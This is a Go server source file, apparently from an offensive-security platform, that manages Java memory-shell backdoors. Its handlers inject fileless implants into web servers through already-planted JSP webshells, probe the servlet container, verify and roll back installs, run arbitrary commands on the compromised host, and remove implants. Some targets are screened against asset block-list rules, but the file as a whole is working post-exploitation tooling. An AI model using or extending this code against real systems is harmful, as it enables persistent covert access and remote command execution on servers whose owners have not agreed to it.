package server

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/scanner"
)

// memshellPayloadFor unseals the per-shell key only for the duration of a
// request. Memory shells speak the same v2 channel as file shells.
func (s *Server) memshellPayloadFor(ms *db.JavaMemshell) (scanner.ShellPayload, error) {
	if ms == nil {
		return scanner.ShellPayload{}, errors.New("内存马不存在")
	}
	if strings.TrimSpace(ms.Secret) == "" {
		return scanner.ShellPayload{}, errors.New("内存马缺少密钥封装")
	}
	plain, err := openShellSecret(s.jwtKey, ms.Secret)
	if err != nil {
		return scanner.ShellPayload{}, err
	}
	key, err := scanner.DecodeShellKey(plain)
	if err != nil {
		return scanner.ShellPayload{}, err
	}
	return scanner.MemshellPayload(key, ms.Carrier)
}

// probeMemshellEndpoint verifies a memory-shell endpoint answers the v2
// protocol. Memory shells implement P/E/I/D but not the parent-only M op, so
// liveness is a ping with short retries for freshly registered endpoints.
func (s *Server) probeMemshellEndpoint(ctx context.Context, client *scanner.DeepClient,
	url string, p scanner.ShellPayload) (string, error) {
	var lastErr error
	for attempt := 0; attempt < 3; attempt++ {
		alive, note := scanner.CheckShellAlive(ctx, client, url, p)
		if alive {
			return note, nil
		}
		if strings.TrimSpace(note) == "" {
			note = "端点无响应"
		}
		lastErr = errors.New(note)
		if attempt < 2 {
			select {
			case <-ctx.Done():
				return "", lastErr
			case <-time.After(400 * time.Millisecond):
			}
		}
	}
	return "", lastErr
}

func (s *Server) listJavaMemshells(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	webshellID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("webshell_id")), 10, 64)
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	list, total, err := pg.ListJavaMemshells(db.JavaMemshellFilter{
		WebshellID: webshellID,
		TaskID:     taskID,
		Status:     q.Get("status"),
		Target:     q.Get("target"),
		Limit:      atoiDefault(q.Get("limit"), 100),
		Offset:     atoiDefault(q.Get("offset"), 0),
	})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"memshells": list, "total": total})
}

func (s *Server) listWebshellMemshells(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的 webshell ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	if _, err := pg.GetWebshell(id); err != nil {
		writeErr(w, 404, "webshell 不存在")
		return
	}
	list, total, err := pg.ListJavaMemshells(db.JavaMemshellFilter{WebshellID: id, Limit: 200})
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"memshells": list, "total": total})
}

func (s *Server) getJavaMemshell(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的内存马 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	ms, err := pg.GetJavaMemshell(id)
	if err != nil {
		writeErr(w, 404, "内存马不存在")
		return
	}
	writeJSON(w, 200, ms)
}

// deployJavaMemshell injects a memory shell through a v2 JSP webshell. The
// install is verified before it is recorded; a failed verification rolls the
// registration back through the parent so no untracked endpoint survives.
func (s *Server) deployJavaMemshell(w http.ResponseWriter, r *http.Request) {
	shellID, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的 webshell ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Type string `json:"type"`
		Name string `json:"name"`
		Path string `json:"path"`
		Port int    `json:"port"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Type) != "" {
		if _, valid := scanner.NormalizeMemshellType(req.Type); !valid {
			writeErr(w, 400, "type 必须是 "+strings.Join(scanner.MemshellTypes, "/"))
			return
		}
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	shell, err := pg.GetWebshell(shellID)
	if err != nil {
		writeErr(w, 404, "webshell 不存在")
		return
	}
	if !strings.EqualFold(shell.Protocol, scanner.ShellProtocolV2) || !strings.EqualFold(shell.ShellType, "jsp") {
		writeErr(w, 400, "只有加密 v2 JSP webshell 可以注入 Java 内存马")
		return
	}
	if strings.TrimSpace(shell.URL) == "" {
		writeErr(w, 400, "该 webshell 没有可用地址")
		return
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
		return
	}
	parentPayload, err := s.shellPayloadFor(shell)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	client := scanner.NewDeepClient(30 * time.Second)
	ctx, cancel := context.WithTimeout(context.WithoutCancel(s.ctx), 90*time.Second)
	defer cancel()

	probeOut, err := scanner.SendShellWire(ctx, client, shell.URL, parentPayload, scanner.MemshellWireProbe())
	if err != nil {
		writeErr(w, 400, "父 webshell 不支持内存马注入，请重新导出并投放最新 v2 JSP 载荷: "+err.Error())
		return
	}
	probeCode, probeFields, err := scanner.ParseMemshellAck(probeOut)
	if err != nil || probeCode != "MSOK" {
		writeErr(w, 400, "父 webshell 的内存马探测失败："+truncateText(probeOut, 160))
		return
	}
	probe := scanner.ParseMemshellProbe(probeFields)
	container := probe.Container
	servletAPI := probe.ServletAPI
	selection, selErr := scanner.SelectMemshellType(probe, req.Type)
	if selErr != nil {
		writeErr(w, 400, selErr.Error())
		return
	}
	typ := selection.Type

	name := strings.TrimSpace(req.Name)
	if name == "" {
		if name, err = scanner.GenerateMemshellName(); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
	}
	endpointPath := strings.TrimSpace(req.Path)
	if endpointPath == "" {
		if endpointPath, err = scanner.GenerateMemshellPath(); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
	}
	key, err := scanner.GenerateShellKey()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	carrier, err := scanner.GenerateShellCarrier()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	spec := scanner.MemshellSpec{
		Type: typ, Name: name, Path: endpointPath, Key: key, Carrier: carrier, Port: req.Port,
	}
	if err := scanner.ValidateMemshellSpec(spec); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	sealed, err := sealShellSecret(s.jwtKey, scanner.EncodeShellKey(key))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	installWire, err := scanner.MemshellWireInstall(spec)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	ack, err := scanner.SendShellWire(ctx, client, shell.URL, parentPayload, installWire)
	if err != nil {
		writeErr(w, 502, "内存马注入失败: "+err.Error())
		return
	}
	ackCode, ackFields, err := scanner.ParseMemshellAck(ack)
	if err != nil || ackCode != "MSOK" {
		writeErr(w, 502, "内存马注入被拒绝："+truncateText(ack, 200))
		return
	}
	port, _ := strconv.Atoi(strings.TrimSpace(ackFields["port"]))
	msCandidates, err := scanner.MemshellURLsFor(shell.URL, spec.Path, port)
	if err != nil {
		s.rollbackMemshell(ctx, client, shell.URL, parentPayload, typ, name, spec.Path)
		writeErr(w, 500, err.Error())
		return
	}
	allowedURLs := make([]string, 0, len(msCandidates))
	var blockedReason string
	for _, candidate := range msCandidates {
		if reason, ok := shellAllowed(pg, candidate); ok {
			allowedURLs = append(allowedURLs, candidate)
		} else if blockedReason == "" {
			blockedReason = reason
		}
	}
	if len(allowedURLs) == 0 {
		s.rollbackMemshell(ctx, client, shell.URL, parentPayload, typ, name, spec.Path)
		writeErr(w, 400, "内存马地址命中资产拦截规则，已回滚："+blockedReason)
		return
	}
	msPayload, err := scanner.MemshellPayload(key, carrier)
	if err != nil {
		s.rollbackMemshell(ctx, client, shell.URL, parentPayload, typ, name, spec.Path)
		writeErr(w, 500, err.Error())
		return
	}
	// 只有真正登记了映射的上下文会用本壳密钥回执，其余候选返回 404，逐个试即可定位。
	var msURL string
	var probeErr error
	for _, candidate := range allowedURLs {
		if _, probeErr = s.probeMemshellEndpoint(ctx, client, candidate, msPayload); probeErr == nil {
			msURL = candidate
			break
		}
	}
	if msURL == "" {
		s.rollbackMemshell(ctx, client, shell.URL, parentPayload, typ, name, spec.Path)
		writeErr(w, 502, "内存马已下发但端点未响应，已回滚："+probeErr.Error())
		return
	}
	target := strings.TrimSpace(shell.Target)
	if target == "" {
		target = msURL
	}
	source := "manual"
	if selection.Auto {
		source = "auto"
	}
	note := fmt.Sprintf("container=%s api=%s java=%s type=%s(%s) %s",
		displayOr(container, "unknown"), displayOr(servletAPI, "unknown"),
		displayOr(probe.JavaVersion, "unknown"), typ, source, selection.Reason)
	ms, err := pg.CreateJavaMemshell(db.JavaMemshellInput{
		WebshellID:  &shell.ID,
		TaskID:      shell.TaskID,
		Type:        typ,
		Name:        name,
		Path:        spec.Path,
		URL:         msURL,
		Port:        port,
		Secret:      sealed,
		Carrier:     carrier,
		Target:      target,
		Container:   container,
		ServletAPI:  servletAPI,
		JavaVersion: probe.JavaVersion,
		Status:      "alive",
		Note:        note,
	})
	if err != nil {
		s.rollbackMemshell(ctx, client, shell.URL, parentPayload, typ, name, spec.Path)
		writeErr(w, 500, "内存马已生效但写入数据库失败，已回滚: "+err.Error())
		return
	}
	s.registerMemshellResource(ms)
	writeJSON(w, 201, map[string]any{"memshell": ms, "selection": selection})
}

func (s *Server) rollbackMemshell(ctx context.Context, client *scanner.DeepClient,
	parentURL string, parentPayload scanner.ShellPayload, typ, name, path string) {
	wire, err := scanner.MemshellWireRemove(typ, name, path)
	if err != nil {
		return
	}
	_, _ = scanner.SendShellWire(ctx, client, parentURL, parentPayload, wire)
}

// checkJavaMemshell probes a memory shell and refreshes its status/signature.
func (s *Server) checkJavaMemshell(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的内存马 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	ms, err := pg.GetJavaMemshell(id)
	if err != nil {
		writeErr(w, 404, "内存马不存在")
		return
	}
	if reason, allowed := shellAllowed(pg, ms.URL); !allowed {
		writeErr(w, 400, "内存马地址命中资产拦截规则，已拒绝："+reason)
		return
	}
	payload, payloadErr := s.memshellPayloadFor(ms)
	client := scanner.NewDeepClient(20 * time.Second)
	ctx, cancel := context.WithTimeout(context.WithoutCancel(s.ctx), 40*time.Second)
	defer cancel()
	if payloadErr != nil {
		_ = pg.UpdateJavaMemshellState(ms.ID, "unknown", "", "密钥不可用: "+payloadErr.Error())
		writeErr(w, 400, payloadErr.Error())
		return
	}
	note, probeErr := s.probeMemshellEndpoint(ctx, client, ms.URL, payload)
	if probeErr == nil {
		if err := pg.UpdateJavaMemshellProbe(ms.ID, "alive", "", "", note); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
		writeJSON(w, 200, map[string]any{"alive": true, "status": "alive", "note": note})
		return
	}
	failNote := truncateText("探测失败: "+probeErr.Error(), 500)
	if err := pg.UpdateJavaMemshellState(ms.ID, "dead", "", failNote); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"alive": false, "status": "dead", "note": failNote})
}

// execJavaMemshell runs one command through the injected endpoint. It shares the
// webshell terminal semantics (cwd trailer, exit code, bounded wait) so both
// channels drive the same workbench component; unlike a landed webshell a
// memory horse has no ledger row to remember a directory in, so the caller
// echoes the cwd back on the next request instead of the server storing it.
func (s *Server) execJavaMemshell(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的内存马 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Command        string `json:"command"`
		Cwd            string `json:"cwd"`
		OSKind         string `json:"os_kind"`
		TimeoutSeconds int    `json:"timeout_seconds"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	ms, err := pg.GetJavaMemshell(id)
	if err != nil {
		writeErr(w, 404, "内存马不存在")
		return
	}
	if reason, allowed := shellAllowed(pg, ms.URL); !allowed {
		writeErr(w, 400, "内存马地址命中资产拦截规则，已拒绝："+reason)
		return
	}
	payload, err := s.memshellPayloadFor(ms)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	ch := shellChannel{URL: ms.URL, Payload: payload}
	res := shellExec(r.Context(), httpShellSender(ch), strings.TrimSpace(req.Cwd), req.OSKind, "", req.Command, clampShellTimeout(req.TimeoutSeconds))
	if res.Output == "" && res.Note != "" {
		res.Output = res.Note
	}
	status := "alive"
	if res.TimedOut {
		status = "unknown"
	}
	_ = pg.UpdateJavaMemshellState(ms.ID, status, truncateText(res.Output, 8000), "")
	writeJSON(w, 200, res)
}

// verifyMemshellGone falls back to a plain HTTP check when the key is no
// longer available (e.g. JWT key rotated after injection).
func (s *Server) verifyMemshellGone(ctx context.Context, client *scanner.DeepClient,
	ms *db.JavaMemshell, payload scanner.ShellPayload, payloadErr error) (bool, string) {
	allowClosed := ms.Type == scanner.MemshellTypeAgent
	if payloadErr == nil {
		return scanner.VerifyMemshellRemoved(ctx, client, ms.URL, payload, allowClosed)
	}
	resp := client.Do(ctx, scanner.DeepRequest{Method: http.MethodGet, URL: ms.URL})
	switch {
	case resp.Error != "":
		if allowClosed {
			return true, "监听端口已关闭（" + resp.Error + "）"
		}
		return false, "复核请求失败：" + resp.Error
	case resp.StatusCode == 404 || resp.StatusCode == 410:
		return true, fmt.Sprintf("HTTP %d，协议请求已被拒绝", resp.StatusCode)
	case resp.StatusCode >= 200 && resp.StatusCode < 400:
		return false, fmt.Sprintf("HTTP %d，端点仍可访问但无法解密验证", resp.StatusCode)
	}
	return false, fmt.Sprintf("HTTP %d，无法确认已移除", resp.StatusCode)
}

// removeJavaMemshellRuntime removes a memory shell through the parent shell
// first (works even when the memshell itself is unhealthy), then falls back to
// the endpoint's own unregister, and verifies the result. It only touches the
// target, never the platform record, so both the API and evacuation share it.
func (s *Server) removeJavaMemshellRuntime(ctx context.Context, pg *db.DB, ms *db.JavaMemshell) (bool, string, []string) {
	client := scanner.NewDeepClient(20 * time.Second)
	payload, payloadErr := s.memshellPayloadFor(ms)
	attempts := []string{}
	parentOK := false

	if ms.WebshellID != nil {
		shell, err := pg.GetWebshell(*ms.WebshellID)
		switch {
		case err != nil || shell == nil:
			attempts = append(attempts, "父 shell 记录不存在，跳过")
		case !strings.EqualFold(shell.Protocol, scanner.ShellProtocolV2) || !strings.EqualFold(shell.ShellType, "jsp"):
			attempts = append(attempts, "父 shell 不是 v2 JSP，跳过")
		case strings.TrimSpace(shell.URL) == "":
			attempts = append(attempts, "父 shell 无可用地址，跳过")
		default:
			parentPayload, perr := s.shellPayloadFor(shell)
			wire, werr := scanner.MemshellWireRemove(ms.Type, ms.Name, ms.Path)
			switch {
			case perr != nil:
				attempts = append(attempts, "父 shell 载荷不可用: "+perr.Error())
			case werr != nil:
				attempts = append(attempts, "无法构造父级清理请求: "+werr.Error())
			default:
				ack, aerr := scanner.SendShellWire(ctx, client, shell.URL, parentPayload, wire)
				if aerr != nil {
					attempts = append(attempts, "父 shell 清理失败: "+aerr.Error())
					break
				}
				code, _, perr := scanner.ParseMemshellAck(ack)
				if perr == nil && code == "MSOK" {
					parentOK = true
					attempts = append(attempts, "父 shell 清理成功")
				} else {
					attempts = append(attempts, "父 shell 返回: "+truncateText(ack, 160))
				}
			}
		}
	} else {
		attempts = append(attempts, "无父 shell 记录，仅能通过端点自移除")
	}

	removed := false
	note := ""
	if parentOK {
		removed, note = s.verifyMemshellGone(ctx, client, ms, payload, payloadErr)
	}
	if !removed && payloadErr == nil {
		self, serr := scanner.MemshellSelfRemove(ctx, client, ms.URL, payload)
		if serr != nil {
			attempts = append(attempts, "内存马自移除失败: "+serr.Error())
		} else {
			attempts = append(attempts, "内存马自移除: "+truncateText(self, 160))
			if self != scanner.MemshellSelfDeleteOK {
				attempts = append(attempts, "自移除回执未确认成功")
			}
		}
		removed, note = s.verifyMemshellGone(ctx, client, ms, payload, payloadErr)
	}
	if !removed {
		removed, note = s.verifyMemshellGone(ctx, client, ms, payload, payloadErr)
	}
	return removed, note, attempts
}

// deleteJavaMemshell removes a memory shell and only deletes the platform
// record after the endpoint is confirmed gone, unless force=1 is passed.
func (s *Server) deleteJavaMemshell(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的内存马 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	ms, err := pg.GetJavaMemshell(id)
	if err != nil {
		writeErr(w, 404, "内存马不存在")
		return
	}
	force := r.URL.Query().Get("force") == "1"
	ctx, cancel := context.WithTimeout(context.WithoutCancel(s.ctx), 60*time.Second)
	defer cancel()
	removed, note, attempts := s.removeJavaMemshellRuntime(ctx, pg, ms)
	if !removed && !force {
		msg := "无法确认内存马已移除"
		if note != "" {
			msg += "：" + note
		}
		_ = pg.UpdateJavaMemshellState(ms.ID, ms.Status, "", truncateText("移除未确认: "+strings.Join(attempts, "；"), 500))
		writeJSON(w, 502, map[string]any{"error": msg, "note": note, "attempts": attempts})
		return
	}
	releaseNote := "内存马已移除"
	if !removed {
		releaseNote = "强制清理记录（端点未确认下线）"
		attempts = append(attempts, "已按 force 参数清理数据库记录，端点可能仍存活")
	}
	s.releaseMemshellResource(ms.ID, releaseNote)
	if _, err := pg.DeleteJavaMemshell(ms.ID); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{
		"ok":       true,
		"removed":  removed,
		"forced":   !removed,
		"note":     note,
		"attempts": attempts,
	})
}
